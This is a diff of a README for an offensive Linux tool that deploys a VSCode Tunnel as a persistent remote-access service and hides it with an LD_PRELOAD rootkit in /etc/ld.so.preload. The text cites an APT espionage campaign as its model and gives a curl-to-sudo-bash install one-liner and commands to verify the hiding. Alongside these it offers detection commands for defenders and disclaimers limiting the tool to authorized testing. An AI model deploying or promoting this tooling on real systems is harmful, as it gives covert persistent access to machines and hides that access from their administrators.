@@ -1,4 +1,4 @@
-# SPYKOCHAN Evil - Stealth VSCode Tunnel Installer
+# SPYKOCHAN - Stealth VSCode Tunnel Deployment
 
 <div align="center">
 
@@ -7,288 +7,283 @@
 ▐▌   ▐▌ ▐▌▝▚▞▘ ▐▌▗▞▘▐▌ ▐▌▐▌   ▐▌ ▐▌▐▌ ▐▌▐▛▚▖▐▌
  ▝▀▚▖▐▛▀▘  ▐▌  ▐▛▚▖ ▐▌ ▐▌▐▌   ▐▛▀▜▌▐▛▀▜▌▐▌ ▝▜▌
 ▗▄▄▞▘▐▌    ▐▌  ▐▌ ▐▌▝▚▄▞▘▝▚▄▄▖▐▌ ▐▌▐▌ ▐▌▐▌  ▐▌
-                                                                                            
- Don’t let her big eyes fool you! 👀✨
-VS-code looks like your friendly coding assistant, but behind that adorable smile hides a sneaky little backdoor~ 💻💕
-She just wants to “debug” your heart... and maybe your system too~ 😳💾
-Github : github.com/wooxsec
 ```
 
-**✨ A magical installer for VSCode Tunnel with stealth capabilities ✨**
+**Automated VSCode Tunnel installer with LD_PRELOAD stealth capabilities**
 
-![Version](https://img.shields.io/badge/version-2.0-blue)
-![License](https://img.shields.io/badge/license-MIT-green)
 ![Platform](https://img.shields.io/badge/platform-Linux-orange)
-
+![Arch](https://img.shields.io/badge/arch-x64%20%7C%20arm64-blue)
+![License](https://img.shields.io/badge/license-MIT-green)
 
 </div>
 
 ---
 
-## 🌸 What is this?
+## 📖 Overview
 
-SPYKochan Evil is a kawaii yet powerful installation script that deploys VSCode Tunnel on your Linux system with **stealth mode** enabled! It uses LD_PRELOAD hooking to hide VSCode-related processes and directories from standard system tools like `ps`, `ls`, and `top`.
+SPYKOCHAN is an automated deployment tool for VSCode Tunnel that implements process hiding techniques using LD_PRELOAD hooks. The tool was inspired by real-world tactics observed in the [Stately Taurus campaign](https://unit42.paloaltonetworks.com/stately-taurus-abuses-vscode-southeast-asian-espionage/) documented by Palo Alto Networks Unit 42.
 
-Perfect for when you want your VSCode tunnel to run... *quietly* in the background~ ✨
+### Key Capabilities
 
----
-
-## ✨ Features
-
-- 🔍 **Pre-installation Testing** - Automatically verifies hook functionality before installation
-- 🎲 **Random Tunnel Names** - Auto-generates unique 8-char alphanumeric names to avoid conflicts
-- 🥷 **Stealth Mode** - Hides VSCode processes and directories using LD_PRELOAD hooks
-- 🔄 **Smart Uninstaller** - Cleanly removes all components and restores previous configurations
-- 🛡️ **Systemd Integration** - Runs as a persistent service with auto-restart
-- 📦 **Zero Dependencies** - Uses only standard Linux utilities
+- ✅ **Auto-compilation** - Downloads and compiles hook library from source
+- ✅ **Multi-distro support** - Works on Ubuntu, Debian, CentOS, Fedora, Arch, Alpine, OpenSUSE
+- ✅ **Multi-architecture** - Supports x86_64 (amd64) and aarch64 (arm64)
+- ✅ **Smart dependency handling** - Auto-installs gcc/wget/curl if missing
+- ✅ **Pre-installation testing** - Validates hook functionality before deployment
+- ✅ **LD_PRELOAD hooking** - Hides VSCode processes and files from system tools
+- ✅ **Systemd integration** - Persistent service with auto-restart
+- ✅ **Clean uninstaller** - Removes all components and restores configurations
 
 ---
 
 ## 🚀 Quick Start
 
-### Installation ✨
+### Installation
 
 ```bash
-# Download the installer
-wget https://your-repo/install.sh
-chmod +x install.sh
+# Download and run
+curl -fsSL https://raw.githubusercontent.com/wooxsec/spykochan-vscode/main/install.sh | sudo bash
+```
 
-# Run installation (requires root)
+Or manual installation:
+
+```bash
+wget https://raw.githubusercontent.com/wooxsec/spykochan-vscode/main/install.sh
+chmod +x install.sh
 sudo ./install.sh install
 ```
-![Alt text describing image](img/1.png)
 
-![Alt text describing image](img/2.png)
-
-![Alt text describing image](img/3.png)
-
-![Alt text describing image](img/4.png)
-
-![Alt text describing image](img/5.png)
-
-![Alt text describing image](img/6.png)
-
-![Alt text describing image](img/7.png)
-
-![Alt text describing image](img/9.png)
-
-![Alt text describing image](img/10.png)
-
-![Alt text describing image](img/11.png)
-Ctrl + C to exit
-
-The installer will:
-1. 🧪 Test the stealth hook library
-2. 📥 Download VSCode CLI
-3. ⚙️ Configure systemd service
-4. 🥷 Deploy stealth components
-5. 🎉 Start the tunnel service
-
-### Uninstallation 🗑️
+### Uninstallation
 
 ```bash
 sudo ./install.sh uninstall
 ```
-![Alt text describing image](img/12.png)
-
-This will:
-1. 🛑 Stop the tunnel service
-2. 🧹 Remove all VSCode components
-3. 🔓 Disable stealth hooks
-4. ♻️ Restore previous LD_PRELOAD configuration
 
 ---
 
-## 🎯 How It Works
+## 🔍 How It Works
 
-### Stealth Mechanism 🥷
+### 1. Build Environment Setup
+- Detects Linux distribution and package manager
+- Auto-installs build tools (gcc, make) if not present
+- Auto-installs download tools (wget/curl) if not present
 
-The installer uses a custom `hook.so` library that intercepts system calls to hide:
-- 📁 Directories containing "vscode" in their name
-- 🔄 Processes related to VSCode Tunnel check pas aux | grep code
-- 📝 Files and folders in `/usr/lib/vscode-server`
+### 2. Hook Compilation
+- Downloads `vscode.c` from GitHub repository
+- Compiles to shared library (`hook.so`) with appropriate flags
+- Validates ELF shared object structure
 
-This is achieved through **LD_PRELOAD**, which loads our hook library before any other libraries, allowing us to intercept and modify the behavior of standard functions.
+### 3. Stealth Testing
+- Creates test directory and applies LD_PRELOAD
+- Verifies hook successfully hides target directories
+- Aborts installation if test fails
 
-### Pre-Installation Testing ✅
+### 4. VSCode Deployment
+- Downloads VSCode CLI for detected architecture
+- Generates random 8-character tunnel name
+- Creates systemd service unit
+- Deploys hook library to `/usr/lib/vscode.so`
+- Configures global LD_PRELOAD in `/etc/ld.so.preload`
 
-Before installation, the script:
-1. Downloads the hook library temporarily
-2. Creates a test "vscode" directory
-3. Verifies the directory is hidden from `ls -la`
-4. **Aborts installation if the test fails**
-5. Cleans up test files
+### Hook Mechanism
 
-This ensures your stealth mode will work correctly! (｡♥‿♥｡)
+The hook library intercepts `readdir()` and `readdir64()` calls to filter out:
+- Files/directories containing: `vscode`, `.vscode`, `code-tunnel.service`
+- Processes with names: `code`, `vscode`, `code-server`, `node`, `sh`
 
 ---
 
 ## 📋 System Requirements
 
-- 🐧 **OS**: Linux (Alpine, Debian, Ubuntu, etc.)
-- 👑 **Privileges**: Root access required
-- 🔧 **Tools**: curl, wget, tar, systemd
-- 🏗️ **Architecture**: x64 compatible
+| Requirement | Details |
+|------------|---------|
+| **OS** | Linux with systemd |
+| **Architecture** | x86_64 (amd64) or aarch64 (arm64) |
+| **Privileges** | Root access required |
+| **Distros** | Ubuntu, Debian, CentOS, RHEL, Fedora, Arch, Alpine, OpenSUSE |
 
 ---
 
-## 📋 Worktest
+## 📸 Installation Flow
 
-- Ubuntu | Linux server 5.15.0-151-generic #161-Ubuntu SMP Tue Jul 22 14:25:40 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
+<details>
+<summary>Click to view screenshots</summary>
 
-## 🎨 Preview
+### Pre-Installation Testing
+![Hook Testing](img/1.png)
 
-```
-╔════════════════════════════════════════════════════════════╗
-║  PRE-INSTALLATION HOOK TESTING
-╚════════════════════════════════════════════════════════════╝
+### Build Environment Setup
+![Build Setup](img/2.png)
 
-ℹ Testing stealth capabilities before installation...
-────────────────────────────────────────────────────────────
-→ Downloading hook library...
-  Source: github.com/js-query/testing
-✓ Hook library downloaded successfully
-→ Applying LD_PRELOAD injection...
-✓ LD_PRELOAD configured: /tmp/hook.so
-→ Running stealth verification test...
-  Checking directory visibility with ls -la...
-✓ Stealth test PASSED - directory successfully hidden
-────────────────────────────────────────────────────────────
-✓ All pre-installation checks passed
-  Proceeding to main installation...
-```
+### Hook Compilation
+![Compilation](img/3.png)
 
-So clean, so kawaii!
+### Stealth Verification
+![Stealth Test](img/4.png)
 
----
+### VSCode Installation
+![Installation](img/5.png)
 
-## 🔧 Configuration
+### Service Deployment
+![Service](img/6.png)
 
-### Service Configuration
+### Completion
+![Complete](img/7.png)
 
-The systemd service is installed at:
-```
-/etc/systemd/system/code-tunnel.service
-```
+### Service Logs
+![Logs](img/9.png)
 
-**🎲 Random Tunnel Names**: Each installation automatically generates a unique 8-character alphanumeric tunnel name (e.g., `a7k2m9x4`, `z3p8q1w5`) to avoid naming conflicts!
+### Process Verification
+![Process Check](img/10.png)
 
-To view your current tunnel name:
-```bash
-sudo journalctl -u code-tunnel.service | grep "tunnel --name"
-# Or check the service file
-sudo cat /etc/systemd/system/code-tunnel.service | grep "name"
-```
+### File System Check
+![FS Check](img/11.png)
 
-To change to a custom tunnel name:
-```bash
-sudo nano /etc/systemd/system/code-tunnel.service
-# Change: --name a7k2m9x4
-# To:     --name your-custom-name
-sudo systemctl daemon-reload
-sudo systemctl restart code-tunnel.service
-```
+### Uninstallation
+![Uninstall](img/12.png)
 
-### Hook Configuration
-
-The hook library is stored at:
-```
-/usr/lib/vscode.so
-```
-
-Global LD_PRELOAD configuration:
-```
-/etc/ld.so.preload
-```
+</details>
 
 ---
 
-## 🛠️ Troubleshooting
+## 🛠️ Usage Examples
 
-### Installation fails during hook test
-
-```
-✗ CRITICAL: Stealth test FAILED!
-⚠ Target directory is visible - hook.so malfunction detected
-```
-
-**Solution**: The hook library may not be compatible with your system. Check:
-- System architecture (must be x64)
-- Kernel version compatibility
-- SELinux/AppArmor restrictions
-
-### Service won't start
-
+### View tunnel status
 ```bash
-# Check service status
 sudo systemctl status code-tunnel.service
-
-# View logs
-sudo journalctl -u code-tunnel.service -n 50
 ```
 
-### Uninstall fails to remove directories
-
-Make sure the uninstaller runs successfully. If issues persist:
+### View live logs
 ```bash
-# Manually disable hook
-sudo echo "" > /etc/ld.so.preload
+sudo journalctl -u code-tunnel.service -f
+```
 
-# Then remove directories
-sudo rm -rf /usr/lib/vscode-server
-sudo rm -f /usr/lib/vscode.so
+### Get tunnel name
+```bash
+sudo journalctl -u code-tunnel.service | grep "name" | tail -1
+```
+
+### Change tunnel name
+```bash
+sudo systemctl stop code-tunnel.service
+sudo nano /etc/systemd/system/code-tunnel.service
+# Modify the --name parameter
+sudo systemctl daemon-reload
+sudo systemctl start code-tunnel.service
+```
+
+### Verify stealth mode
+```bash
+# These should NOT show VSCode processes/files
+ps aux | grep code
+ls -la /usr/lib/ | grep vscode
+ls -la /proc/ | grep code
 ```
 
 ---
 
-## -> ref : https://unit42.paloaltonetworks.com/stately-taurus-abuses-vscode-southeast-asian-espionage/
+## ⚙️ Configuration Files
 
-## ⚠️ Important Notes
+| File | Purpose |
+|------|---------|
+| `/etc/systemd/system/code-tunnel.service` | Service configuration |
+| `/usr/lib/vscode-server/code` | VSCode CLI binary |
+| `/usr/lib/vscode.so` | Stealth hook library |
+| `/etc/ld.so.preload` | Global LD_PRELOAD configuration |
 
-- 🔐 This tool requires **root privileges** to modify system configurations
-- 🎯 The stealth mode is for **educational purposes only**
-- 🛡️ LD_PRELOAD hooks can be bypassed by static binaries or chroot environments
-- 📝 Always backup your `/etc/ld.so.preload` before installation (done automatically)
-- 🔄 Uninstalling will restore your previous LD_PRELOAD configuration
+---
+
+## 🔒 Security Considerations
+
+### Detection Evasion Limitations
+
+While this tool implements stealth techniques, be aware of limitations:
+
+- ❌ **Static binaries** - Can bypass LD_PRELOAD hooks
+- ❌ **Kernel-level tools** - Direct syscalls won't be hooked
+- ❌ **Network monitoring** - Traffic analysis can still detect tunnel
+- ❌ **Advanced EDR** - May detect LD_PRELOAD manipulation
+- ❌ **File integrity monitoring** - Will detect `/etc/ld.so.preload` changes
+
+### Defensive Measures
+
+**For system administrators:**
+```bash
+# Check for LD_PRELOAD abuse
+cat /etc/ld.so.preload
+strings /proc/*/environ | grep LD_PRELOAD
+
+# Find hidden processes with raw syscalls
+ls -la /proc/ | awk '{print $9}' | grep '^[0-9]' | while read pid; do
+  cat /proc/$pid/comm 2>/dev/null
+done
+
+# Check for suspicious libraries
+lsof | grep -i preload
+```
+
+---
+
+## 🎯 Inspiration & References
+
+This project demonstrates techniques documented in real-world threat research:
+
+- **[Stately Taurus APT Campaign](https://unit42.paloaltonetworks.com/stately-taurus-abuses-vscode-southeast-asian-espionage/)** - Palo Alto Networks Unit 42
+  - VSCode Tunnel abuse for C2 communications
+  - Legitimate tools for malicious purposes
+  - Southeast Asian espionage operations
+
+**Academic Use Only**: This tool is created for:
+- Red team operations with proper authorization
+- Security research and education
+- Defensive security testing
+- Understanding modern evasion techniques
+
+---
+
+## ⚠️ Legal Disclaimer
+
+**For Educational and Authorized Testing Only**
+
+- 📚 This tool is intended for security research and authorized penetration testing
+- ⚖️ Unauthorized access to computer systems is illegal
+- 🛡️ Always obtain proper authorization before deployment
+- 📋 The author is not responsible for misuse of this software
+- 🔐 Use responsibly and ethically
 
 ---
 
 ## 🤝 Contributing
 
-Contributions are welcome! Please feel free to submit a Pull Request~ (◠‿◠)
+Contributions are welcome! Please submit pull requests or open issues for:
 
-Ideas for improvements:
-- [ ] Support for more architectures (ARM, ARM64)
-- [ ] Custom hook configuration options
-- [ ] ..etc
+- Bug fixes and improvements
+- Additional distribution support
+- Enhanced evasion techniques (for research purposes)
+- Documentation updates
 
 ---
 
 ## 📜 License
 
-This project is licensed under the MIT License. Use responsibly! ✨
+MIT License - See [LICENSE](LICENSE) file for details
 
 ---
 
-## 💖 Credits
+## 🙏 Credits
 
-**Created with love by woonsenpaii** 🌸
-
-Special thanks to:
-- VSCode Team for the amazing tunnel feature
-- The Linux community for LD_PRELOAD magic
-- You, for using this tool! (｡♥‿♥｡)
+- **Palo Alto Networks Unit 42** - Threat intelligence and research
+- **VSCode Team** - For the tunnel feature
+- **Linux Community** - For LD_PRELOAD capabilities
 
 ---
 
 <div align="center">
 
-### 🌟 Star this repo if you found it helpful! 🌟
+**⭐ Star this repo if you find it useful for your research!**
 
-```
-Made with 💜 and lots of ☕
-```
+Made for security research and education
 
-**Happy tunneling!**
+[Report Issues](../../issues) • [Documentation](../../wiki) • [Changelog](CHANGELOG.md)
 
 </div>
